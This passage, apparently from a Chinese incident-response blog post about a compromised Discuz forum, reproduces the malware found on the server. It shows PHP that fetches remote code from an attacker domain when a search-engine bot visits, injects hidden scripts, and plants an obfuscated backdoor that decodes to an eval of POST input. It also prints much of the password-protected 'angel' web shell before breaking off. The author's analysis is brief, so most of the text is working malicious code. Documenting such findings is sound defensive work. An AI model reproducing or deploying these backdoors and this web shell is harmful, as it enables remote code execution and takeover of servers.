<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">getdata</span>($<span style="color: #eeeeec;">data_url</span>){
<span style="color: #729fcf; font-weight: bold;">if</span> (<span style="color: #eeeeec; background-color: #2e3436;">function_exists(</span><span style="color: #ad7fa8; font-style: italic;">'curl_exec'</span>)) {
$<span style="color: #eeeeec;">sp_curl</span> = @<span style="color: #eeeeec; background-color: #2e3436;">curl_init(</span>);
<span style="color: #eeeeec; background-color: #2e3436;">curl_setopt(</span>$<span style="color: #eeeeec;">sp_curl</span>, <span style="color: #f57900; font-weight: bold;">CURLOPT_URL</span>, $<span style="color: #eeeeec;">data_url</span>);
<span style="color: #eeeeec; background-color: #2e3436;">curl_setopt(</span>$<span style="color: #eeeeec;">sp_curl</span>, <span style="color: #f57900; font-weight: bold;">CURLOPT_HEADER</span>, <span style="color: #eeeeec; background-color: #2e3436;">0</span>);
<span style="color: #eeeeec; background-color: #2e3436;">curl_setopt(</span>$<span style="color: #eeeeec;">sp_curl</span>, <span style="color: #f57900; font-weight: bold;">CURLOPT_CONNECTTIMEOUT</span>, <span style="color: #eeeeec; background-color: #2e3436;">5</span>);
<span style="color: #eeeeec; background-color: #2e3436;">curl_setopt(</span>$<span style="color: #eeeeec;">sp_curl</span>, <span style="color: #f57900; font-weight: bold;">CURLOPT_RETURNTRANSFER</span>, <span style="color: #eeeeec; background-color: #2e3436;">1</span>);
$<span style="color: #eeeeec;">contents</span> = @<span style="color: #eeeeec; background-color: #2e3436;">curl_exec(</span>$<span style="color: #eeeeec;">sp_curl</span>);
@<span style="color: #eeeeec; background-color: #2e3436;">curl_close(</span>$<span style="color: #eeeeec;">sp_curl</span>);
}<span style="color: #729fcf; font-weight: bold;">elseif</span>(<span style="color: #eeeeec; background-color: #2e3436;">function_exists(</span><span style="color: #ad7fa8; font-style: italic;">'stream_context_create'</span>)) {
$<span style="color: #eeeeec;">sp_cont</span> = <span style="color: #eeeeec; background-color: #2e3436;">array(</span><span style="color: #ad7fa8; font-style: italic;">'http'</span> =<span style="color: #8ae234;">&gt;</span> <span style="color: #eeeeec; background-color: #2e3436;">array(</span><span style="color: #ad7fa8; font-style: italic;">'method'</span> =&gt; <span style="color: #ad7fa8; font-style: italic;">'GET'</span>,<span style="color: #ad7fa8; font-style: italic;">'timeout'</span> =&gt; <span style="color: #eeeeec; background-color: #2e3436;">5</span>));
$<span style="color: #eeeeec;">sp_stre</span> = @<span style="color: #eeeeec; background-color: #2e3436;">stream_context_create(</span>$<span style="color: #eeeeec;">sp_cont</span>);
$<span style="color: #eeeeec;">contents</span> = @<span style="color: #eeeeec; background-color: #2e3436;">file_get_contents(</span>$<span style="color: #eeeeec;">data_url</span>, <span style="color: #8ae234;">false</span>, $<span style="color: #eeeeec;">sp_stre</span>);
}<span style="color: #729fcf; font-weight: bold;">else</span>{
$<span style="color: #eeeeec;">handle</span> = @<span style="color: #eeeeec; background-color: #2e3436;">fopen(</span>$<span style="color: #eeeeec;">data_url</span>, <span style="color: #ad7fa8; font-style: italic;">"rb"</span>); 
$<span style="color: #eeeeec;">contents</span> = @<span style="color: #eeeeec; background-color: #2e3436;">stream_get_contents(</span>$<span style="color: #eeeeec;">handle</span>); 
@<span style="color: #eeeeec; background-color: #2e3436;">fclose(</span>$<span style="color: #eeeeec;">handle</span>);
}
<span style="color: #729fcf; font-weight: bold;">return</span> $<span style="color: #eeeeec;">contents</span>;
}
<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">show</span>($<span style="color: #eeeeec;">fileDir</span>){
$<span style="color: #eeeeec;">filename</span>=$<span style="color: #eeeeec;">fileDir</span><span style="color: #f57900; font-weight: bold;">.</span><span style="color: #eeeeec; background-color: #2e3436;">md5(</span>$<span style="color: #8ae234;">_SERVER</span>[<span style="color: #ad7fa8; font-style: italic;">'HTTP_HOST'</span>].$<span style="color: #8ae234;">_SERVER</span>[<span style="color: #ad7fa8; font-style: italic;">'REQUEST_URI'</span>]);
<span style="color: #729fcf; font-weight: bold;">if</span>(<span style="color: #eeeeec; background-color: #2e3436;">is_file(</span>$<span style="color: #eeeeec;">filename</span>)){
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">fp</span>=@<span style="color: #eeeeec; background-color: #2e3436;">fopen(</span>$<span style="color: #eeeeec;">filename</span>,<span style="color: #ad7fa8; font-style: italic;">'r'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">data</span>=@<span style="color: #eeeeec; background-color: #2e3436;">fread(</span>$<span style="color: #eeeeec;">fp</span>,<span style="color: #eeeeec; background-color: #2e3436;">filesize(</span>$<span style="color: #eeeeec;">filename</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> @<span style="color: #eeeeec; background-color: #2e3436;">fclose(</span>$<span style="color: #eeeeec;">fp</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>(<span style="color: #eeeeec; background-color: #2e3436;">empty(</span>$<span style="color: #eeeeec;">data</span>)) {@<span style="color: #eeeeec; background-color: #2e3436;">unlink(</span>$<span style="color: #eeeeec;">filename</span>);<span style="color: #729fcf; font-weight: bold;">return</span>;}
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">dec0de(</span>$<span style="color: #eeeeec;">fileDir</span>,$<span style="color: #eeeeec;">data</span>);
} <span style="color: #729fcf; font-weight: bold;">else</span> {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">data</span>=<span style="color: #eeeeec; background-color: #2e3436;">getdata(</span><span style="color: #ad7fa8; font-style: italic;">'http://bet.discuz.com.de/w0shiOo7.php?HOST='</span>.$<span style="color: #8ae234;">_SERVER</span>[<span style="color: #ad7fa8; font-style: italic;">'HTTP_HOST'</span>]);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">fp</span>=@<span style="color: #eeeeec; background-color: #2e3436;">fopen(</span>$<span style="color: #eeeeec;">filename</span>,<span style="color: #ad7fa8; font-style: italic;">'w'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> @<span style="color: #eeeeec; background-color: #2e3436;">fwrite(</span>$<span style="color: #eeeeec;">fp</span>,$<span style="color: #eeeeec;">data</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> @<span style="color: #eeeeec; background-color: #2e3436;">fclose(</span>$<span style="color: #eeeeec;">fp</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>(<span style="color: #eeeeec; background-color: #2e3436;">strlen(</span>$<span style="color: #eeeeec;">data</span>) &gt; <span style="color: #eeeeec; background-color: #2e3436;">1000</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">dec0de(</span>$<span style="color: #eeeeec;">fileDir</span>,$<span style="color: #eeeeec;">data</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
}}
<span style="color: #729fcf; font-weight: bold;">if</span>(!<span style="color: #eeeeec; background-color: #2e3436;">in_array(</span>$<span style="color: #eeeeec;">IP</span>,$<span style="color: #eeeeec;">KIP</span>)){
<span style="color: #729fcf; font-weight: bold;">foreach</span>($<span style="color: #eeeeec;">KBot</span> <span style="color: #729fcf; font-weight: bold;">as</span> $<span style="color: #eeeeec;">KBots</span>){<span style="color: #729fcf; font-weight: bold;">if</span>(<span style="color: #eeeeec; background-color: #2e3436;">stristr(</span>$<span style="color: #eeeeec;">Bot</span>,$<span style="color: #eeeeec;">KBots</span>)){
<span style="color: #eeeeec; background-color: #2e3436;">show(</span>$<span style="color: #eeeeec;">fileDir</span>);
}}<span style="color: #729fcf; font-weight: bold;">foreach</span>($<span style="color: #eeeeec;">Key</span> <span style="color: #729fcf; font-weight: bold;">as</span> $<span style="color: #eeeeec;">Keys</span>){
<span style="color: #729fcf; font-weight: bold;">if</span>(<span style="color: #eeeeec; background-color: #2e3436;">stristr(</span>$<span style="color: #eeeeec;">Ref</span>,$<span style="color: #eeeeec;">Keys</span>)){
<span style="color: #729fcf; font-weight: bold;">echo</span> <span style="color: #ad7fa8; font-style: italic;">"&lt;div style='display:none'&gt;&lt;script language='javascript' src='http://count31.51yes.com/click.aspx?id=310940343&amp;logo=1' charset='gb2312'&gt;&lt;/script&gt;&lt;/div&gt;&lt;script type='text/javascript' src='http://api.discuz.com.de/Seo.js'&gt;&lt;/script&gt;"</span>;}}}
</pre>
</div>
</li>
</ul>

<p>
上面代码的目的就是下载恶意代码并执行。  
</p>
</div>
</div>

<div id="outline-container-sec-4" class="outline-2">
<h2 id="sec-4">继续排查</h2>
<div class="outline-text-2" id="text-4">
<p>
通过比较svn中的代码与现网的代码还发现了一个新的后门程序
</p>

<ul class="org-ul">
<li><code>uc_client/control/class.php</code>

<div class="org-src-container">

<pre class="src src-php"><span style="color: #729fcf;">&lt;?php</span> $<span style="color: #eeeeec;">mt</span>=<span style="color: #ad7fa8; font-style: italic;">"mFsKCleRfU"</span>; $<span style="color: #eeeeec;">ojj</span>=<span style="color: #ad7fa8; font-style: italic;">"IEBleldle"</span>; $<span style="color: #eeeeec;">hsa</span>=<span style="color: #ad7fa8; font-style: italic;">"E9TVFsnd2VuJ10p"</span>; $<span style="color: #eeeeec;">fnx</span>=<span style="color: #ad7fa8; font-style: italic;">"Ow=="</span>; $<span style="color: #eeeeec;">zk</span> = <span style="color: #eeeeec; background-color: #2e3436;">str_replace(</span><span style="color: #ad7fa8; font-style: italic;">"d"</span>,<span style="color: #ad7fa8; font-style: italic;">""</span>,<span style="color: #ad7fa8; font-style: italic;">"sdtdrd_redpdldadcde"</span>); $<span style="color: #eeeeec;">ef</span> = $<span style="color: #eeeeec;">zk</span>(<span style="color: #ad7fa8; font-style: italic;">"z"</span>, <span style="color: #ad7fa8; font-style: italic;">""</span>, <span style="color: #ad7fa8; font-style: italic;">"zbazsze64_zdzeczodze"</span>); $<span style="color: #eeeeec;">dva</span> = $<span style="color: #eeeeec;">zk</span>(<span style="color: #ad7fa8; font-style: italic;">"p"</span>,<span style="color: #ad7fa8; font-style: italic;">""</span>,<span style="color: #ad7fa8; font-style: italic;">"pcprpepaptpe_fpupnpcptpipopn"</span>); $<span style="color: #eeeeec;">zvm</span> = $<span style="color: #eeeeec;">dva</span>(<span style="color: #ad7fa8; font-style: italic;">''</span>, $<span style="color: #eeeeec;">ef</span>($<span style="color: #eeeeec;">zk</span>(<span style="color: #ad7fa8; font-style: italic;">"le"</span>, <span style="color: #ad7fa8; font-style: italic;">""</span>, $<span style="color: #eeeeec;">ojj</span><span style="color: #f57900; font-weight: bold;">.</span>$<span style="color: #eeeeec;">mt</span>.$<span style="color: #eeeeec;">hsa</span><span style="color: #f57900; font-weight: bold;">.</span>$<span style="color: #eeeeec;">fnx</span>))); $<span style="color: #eeeeec;">zvm</span>(); <span style="color: #729fcf;">?&gt;</span>
</pre>
</div>

<p>
解码后的结果
</p>

<div class="org-src-container">

<pre class="src src-php">@<span style="color: #eeeeec; background-color: #2e3436;">eval(</span>$<span style="color: #8ae234;">_POST</span>[<span style="color: #ad7fa8; font-style: italic;">'wen'</span>]);
</pre>
</div>

<p>
上面的脚本可以注入任意的代码。
</p>
</li>

<li><code>./uc_server/data/tmp/angel.php</code>

<div class="org-src-container">

<pre class="src src-php"><span style="color: #729fcf;">&lt;?php</span>
<span style="color: #eeeeec; background-color: #2e3436;">error_reporting(7</span>);
@<span style="color: #eeeeec; background-color: #2e3436;">set_magic_quotes_runtime(0</span>);
<span style="color: #eeeeec; background-color: #2e3436;">ob_start(</span>);
$<span style="color: #eeeeec;">mtime</span> = <span style="color: #eeeeec; background-color: #2e3436;">explode(</span><span style="color: #ad7fa8; font-style: italic;">' '</span>, <span style="color: #eeeeec; background-color: #2e3436;">microtime(</span>));
$<span style="color: #eeeeec;">starttime</span> = $<span style="color: #eeeeec;">mtime</span>[<span style="color: #eeeeec; background-color: #2e3436;">1</span>] + $<span style="color: #eeeeec;">mtime</span>[<span style="color: #eeeeec; background-color: #2e3436;">0</span>];
<span style="color: #eeeeec; background-color: #2e3436;">define(</span><span style="color: #ad7fa8; font-style: italic;">'SA_ROOT'</span>, <span style="color: #eeeeec; background-color: #2e3436;">str_replace(</span><span style="color: #ad7fa8; font-style: italic;">'\\'</span>, <span style="color: #ad7fa8; font-style: italic;">'/'</span>, <span style="color: #eeeeec; background-color: #2e3436;">dirname(</span><span style="color: #8ae234;">__FILE__</span>)).<span style="color: #ad7fa8; font-style: italic;">'/'</span>);
<span style="color: #eeeeec; background-color: #2e3436;">define(</span><span style="color: #ad7fa8; font-style: italic;">'IS_WIN'</span>, <span style="color: #8ae234;">DIRECTORY_SEPARATOR</span> == <span style="color: #ad7fa8; font-style: italic;">'\\'</span>);
<span style="color: #eeeeec; background-color: #2e3436;">define(</span><span style="color: #ad7fa8; font-style: italic;">'IS_COM'</span>, <span style="color: #eeeeec; background-color: #2e3436;">class_exists(</span><span style="color: #ad7fa8; font-style: italic;">'COM'</span>) ? <span style="color: #eeeeec; background-color: #2e3436;">1</span> : <span style="color: #eeeeec; background-color: #2e3436;">0</span> );
<span style="color: #eeeeec; background-color: #2e3436;">define(</span><span style="color: #ad7fa8; font-style: italic;">'IS_GPC'</span>, <span style="color: #eeeeec; background-color: #2e3436;">get_magic_quotes_gpc(</span>));
$<span style="color: #eeeeec;">dis_func</span> = <span style="color: #eeeeec; background-color: #2e3436;">get_cfg_var(</span><span style="color: #ad7fa8; font-style: italic;">'disable_functions'</span>);
<span style="color: #eeeeec; background-color: #2e3436;">define(</span><span style="color: #ad7fa8; font-style: italic;">'IS_PHPINFO'</span>, (!<span style="color: #eeeeec; background-color: #2e3436;">eregi(</span><span style="color: #ad7fa8; font-style: italic;">"phpinfo"</span>,$<span style="color: #eeeeec;">dis_func</span>)) ? <span style="color: #eeeeec; background-color: #2e3436;">1</span> : <span style="color: #eeeeec; background-color: #2e3436;">0</span> );
@<span style="color: #eeeeec; background-color: #2e3436;">set_time_limit(0</span>);@<span style="color: #eeeeec; background-color: #2e3436;">preg_replace(</span><span style="color: #ad7fa8; font-style: italic;">"/[email]/e"</span>,$<span style="color: #8ae234;">_POST</span>[<span style="color: #ad7fa8; font-style: italic;">'Id'</span>],<span style="color: #ad7fa8; font-style: italic;">"error"</span>);

<span style="color: #729fcf; font-weight: bold;">foreach</span>($<span style="color: #8ae234;">_POST</span> <span style="color: #729fcf; font-weight: bold;">as</span> $<span style="color: #eeeeec;">key</span> =<span style="color: #8ae234;">&gt;</span> $<span style="color: #eeeeec;">value</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> (<span style="color: #f57900; font-weight: bold;">IS_GPC</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">value</span> = <span style="color: #eeeeec; background-color: #2e3436;">s_array(</span>$<span style="color: #eeeeec;">value</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">$key</span> = $<span style="color: #eeeeec;">value</span>;
}
<span style="color: #888a85;">/*</span><span style="color: #888a85;">===================== &#31243;&#24207;&#37197;&#32622; =====================</span><span style="color: #888a85;">*/</span>

<span style="color: #888a85;">//</span><span style="color: #888a85;">echo encode_pass('angel');exit;</span>
<span style="color: #888a85;">//</span><span style="color: #888a85;">angel = ec38fe2a8497e0a8d6d349b3533038cb</span>
<span style="color: #888a85;">// </span><span style="color: #888a85;">&#22914;&#26524;&#38656;&#35201;&#23494;&#30721;&#39564;&#35777;,&#35831;&#20462;&#25913;&#30331;&#38470;&#23494;&#30721;,&#30041;&#31354;&#20026;&#19981;&#38656;&#35201;&#39564;&#35777;</span>
$<span style="color: #eeeeec;">pass</span><span style="background-color: #404040;"> </span> = <span style="color: #ad7fa8; font-style: italic;">'ec38fe2a8497e0a8d6d349b3533038cb'</span>; <span style="color: #888a85;">//</span><span style="color: #888a85;">angel</span>

<span style="color: #888a85;">//</span><span style="color: #888a85;">&#22914;&#24744;&#23545; cookie &#20316;&#29992;&#33539;&#22260;&#26377;&#29305;&#27530;&#35201;&#27714;, &#25110;&#30331;&#24405;&#19981;&#27491;&#24120;, &#35831;&#20462;&#25913;&#19979;&#38754;&#21464;&#37327;, &#21542;&#21017;&#35831;&#20445;&#25345;&#40664;&#35748;</span>
<span style="color: #888a85;">// </span><span style="color: #888a85;">cookie &#21069;&#32512;</span>
$<span style="color: #eeeeec;">cookiepre</span> = <span style="color: #ad7fa8; font-style: italic;">''</span>;
<span style="color: #888a85;">// </span><span style="color: #888a85;">cookie &#20316;&#29992;&#22495;</span>
$<span style="color: #eeeeec;">cookiedomain</span> = <span style="color: #ad7fa8; font-style: italic;">''</span>;
<span style="color: #888a85;">// </span><span style="color: #888a85;">cookie &#20316;&#29992;&#36335;&#24452;</span>
$<span style="color: #eeeeec;">cookiepath</span> = <span style="color: #ad7fa8; font-style: italic;">'/'</span>;
<span style="color: #888a85;">// </span><span style="color: #888a85;">cookie &#26377;&#25928;&#26399;</span>
$<span style="color: #eeeeec;">cookielife</span> = <span style="color: #eeeeec; background-color: #2e3436;">86400</span>;

<span style="color: #888a85;">//</span><span style="color: #888a85;">&#31243;&#24207;&#25628;&#32034;&#21487;&#20889;&#25991;&#20214;&#30340;&#31867;&#22411;</span>
!$<span style="color: #eeeeec;">writabledb</span> &amp;&amp; $<span style="color: #eeeeec;">writabledb</span> = <span style="color: #ad7fa8; font-style: italic;">'php,cgi,pl,asp,inc,js,html,htm,jsp'</span>;
<span style="color: #888a85;">/*</span><span style="color: #888a85;">===================== &#37197;&#32622;&#32467;&#26463; =====================</span><span style="color: #888a85;">*/</span>

$<span style="color: #eeeeec;">charsetdb</span> = <span style="color: #eeeeec; background-color: #2e3436;">array(</span><span style="color: #ad7fa8; font-style: italic;">''</span>,<span style="color: #ad7fa8; font-style: italic;">'armscii8'</span>,<span style="color: #ad7fa8; font-style: italic;">'ascii'</span>,<span style="color: #ad7fa8; font-style: italic;">'big5'</span>,<span style="color: #ad7fa8; font-style: italic;">'binary'</span>,<span style="color: #ad7fa8; font-style: italic;">'cp1250'</span>,<span style="color: #ad7fa8; font-style: italic;">'cp1251'</span>,<span style="color: #ad7fa8; font-style: italic;">'cp1256'</span>,<span style="color: #ad7fa8; font-style: italic;">'cp1257'</span>,<span style="color: #ad7fa8; font-style: italic;">'cp850'</span>,<span style="color: #ad7fa8; font-style: italic;">'cp852'</span>,<span style="color: #ad7fa8; font-style: italic;">'cp866'</span>,<span style="color: #ad7fa8; font-style: italic;">'cp932'</span>,<span style="color: #ad7fa8; font-style: italic;">'dec8'</span>,<span style="color: #ad7fa8; font-style: italic;">'euc-jp'</span>,<span style="color: #ad7fa8; font-style: italic;">'euc-kr'</span>,<span style="color: #ad7fa8; font-style: italic;">'gb2312'</span>,<span style="color: #ad7fa8; font-style: italic;">'gbk'</span>,<span style="color: #ad7fa8; font-style: italic;">'geostd8'</span>,<span style="color: #ad7fa8; font-style: italic;">'greek'</span>,<span style="color: #ad7fa8; font-style: italic;">'hebrew'</span>,<span style="color: #ad7fa8; font-style: italic;">'hp8'</span>,<span style="color: #ad7fa8; font-style: italic;">'keybcs2'</span>,<span style="color: #ad7fa8; font-style: italic;">'koi8r'</span>,<span style="color: #ad7fa8; font-style: italic;">'koi8u'</span>,<span style="color: #ad7fa8; font-style: italic;">'latin1'</span>,<span style="color: #ad7fa8; font-style: italic;">'latin2'</span>,<span style="color: #ad7fa8; font-style: italic;">'latin5'</span>,<span style="color: #ad7fa8; font-style: italic;">'latin7'</span>,<span style="color: #ad7fa8; font-style: italic;">'macce'</span>,<span style="color: #ad7fa8; font-style: italic;">'macroman'</span>,<span style="color: #ad7fa8; font-style: italic;">'sjis'</span>,<span style="color: #ad7fa8; font-style: italic;">'swe7'</span>,<span style="color: #ad7fa8; font-style: italic;">'tis620'</span>,<span style="color: #ad7fa8; font-style: italic;">'ucs2'</span>,<span style="color: #ad7fa8; font-style: italic;">'ujis'</span>,<span style="color: #ad7fa8; font-style: italic;">'utf8'</span>);
<span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">charset</span> == <span style="color: #ad7fa8; font-style: italic;">'utf8'</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">header(</span><span style="color: #ad7fa8; font-style: italic;">"content-Type: text/html; charset=utf-8"</span>);
} <span style="color: #729fcf; font-weight: bold;">elseif</span> ($<span style="color: #eeeeec;">charset</span> == <span style="color: #ad7fa8; font-style: italic;">'big5'</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">header(</span><span style="color: #ad7fa8; font-style: italic;">"content-Type: text/html; charset=big5"</span>);
} <span style="color: #729fcf; font-weight: bold;">elseif</span> ($<span style="color: #eeeeec;">charset</span> == <span style="color: #ad7fa8; font-style: italic;">'gbk'</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">header(</span><span style="color: #ad7fa8; font-style: italic;">"content-Type: text/html; charset=gbk"</span>);
} <span style="color: #729fcf; font-weight: bold;">elseif</span> ($<span style="color: #eeeeec;">charset</span> == <span style="color: #ad7fa8; font-style: italic;">'latin1'</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">header(</span><span style="color: #ad7fa8; font-style: italic;">"content-Type: text/html; charset=iso-8859-2"</span>);
} <span style="color: #729fcf; font-weight: bold;">elseif</span> ($<span style="color: #eeeeec;">charset</span> == <span style="color: #ad7fa8; font-style: italic;">'euc-kr'</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">header(</span><span style="color: #ad7fa8; font-style: italic;">"content-Type: text/html; charset=euc-kr"</span>);
} <span style="color: #729fcf; font-weight: bold;">elseif</span> ($<span style="color: #eeeeec;">charset</span> == <span style="color: #ad7fa8; font-style: italic;">'euc-jp'</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">header(</span><span style="color: #ad7fa8; font-style: italic;">"content-Type: text/html; charset=euc-jp"</span>);
}

$<span style="color: #eeeeec;">self</span> = $<span style="color: #8ae234;">_SERVER</span>[<span style="color: #ad7fa8; font-style: italic;">'PHP_SELF'</span>] ? $<span style="color: #8ae234;">_SERVER</span>[<span style="color: #ad7fa8; font-style: italic;">'PHP_SELF'</span>] : $<span style="color: #8ae234;">_SERVER</span>[<span style="color: #ad7fa8; font-style: italic;">'SCRIPT_NAME'</span>];
$<span style="color: #eeeeec;">timestamp</span> = <span style="color: #eeeeec; background-color: #2e3436;">time(</span>);

<span style="color: #888a85;">/*</span><span style="color: #888a85;">===================== &#36523;&#20221;&#39564;&#35777; =====================</span><span style="color: #888a85;">*/</span>
<span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">action</span> == <span style="color: #ad7fa8; font-style: italic;">"logout"</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">scookie(</span><span style="color: #ad7fa8; font-style: italic;">'loginpass'</span>, <span style="color: #ad7fa8; font-style: italic;">''</span>, -<span style="color: #eeeeec; background-color: #2e3436;">86400</span> * <span style="color: #eeeeec; background-color: #2e3436;">365</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> @<span style="color: #eeeeec; background-color: #2e3436;">header(</span><span style="color: #ad7fa8; font-style: italic;">'Location: '</span>.$<span style="color: #eeeeec;">self</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">exit</span>;
}
<span style="color: #729fcf; font-weight: bold;">if</span>($<span style="color: #eeeeec;">pass</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">action</span> == <span style="color: #ad7fa8; font-style: italic;">'login'</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">pass</span> == <span style="color: #eeeeec; background-color: #2e3436;">encode_pass(</span>$<span style="color: #eeeeec;">password</span>)) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">scookie(</span><span style="color: #ad7fa8; font-style: italic;">'loginpass'</span>,<span style="color: #eeeeec; background-color: #2e3436;">encode_pass(</span>$<span style="color: #eeeeec;">password</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> @<span style="color: #eeeeec; background-color: #2e3436;">header(</span><span style="color: #ad7fa8; font-style: italic;">'Location: '</span>.$<span style="color: #eeeeec;">self</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">exit</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #8ae234;">_COOKIE</span>[<span style="color: #ad7fa8; font-style: italic;">'loginpass'</span>]) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #8ae234;">_COOKIE</span>[<span style="color: #ad7fa8; font-style: italic;">'loginpass'</span>] != $<span style="color: #eeeeec;">pass</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">loginpage(</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> } <span style="color: #729fcf; font-weight: bold;">else</span> {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">loginpage(</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
}
<span style="color: #888a85;">/*</span><span style="color: #888a85;">===================== &#39564;&#35777;&#32467;&#26463; =====================</span><span style="color: #888a85;">*/</span>

$<span style="color: #eeeeec;">errmsg</span> = <span style="color: #ad7fa8; font-style: italic;">''</span>;
!$<span style="color: #eeeeec;">action</span> &amp;&amp; $<span style="color: #eeeeec;">action</span> = <span style="color: #ad7fa8; font-style: italic;">'file'</span>;

<span style="color: #888a85;">// </span><span style="color: #888a85;">&#26597;&#30475;PHPINFO</span>
<span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">action</span> == <span style="color: #ad7fa8; font-style: italic;">'phpinfo'</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> (<span style="color: #f57900; font-weight: bold;">IS_PHPINFO</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">phpinfo(</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">exit</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> } <span style="color: #729fcf; font-weight: bold;">else</span> {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">errmsg</span> = <span style="color: #ad7fa8; font-style: italic;">'phpinfo() function has non-permissible'</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
}

<span style="color: #888a85;">// </span><span style="color: #888a85;">&#19979;&#36733;&#25991;&#20214;</span>
<span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">doing</span> == <span style="color: #ad7fa8; font-style: italic;">'downfile'</span> &amp;&amp; $<span style="color: #eeeeec;">thefile</span>) {
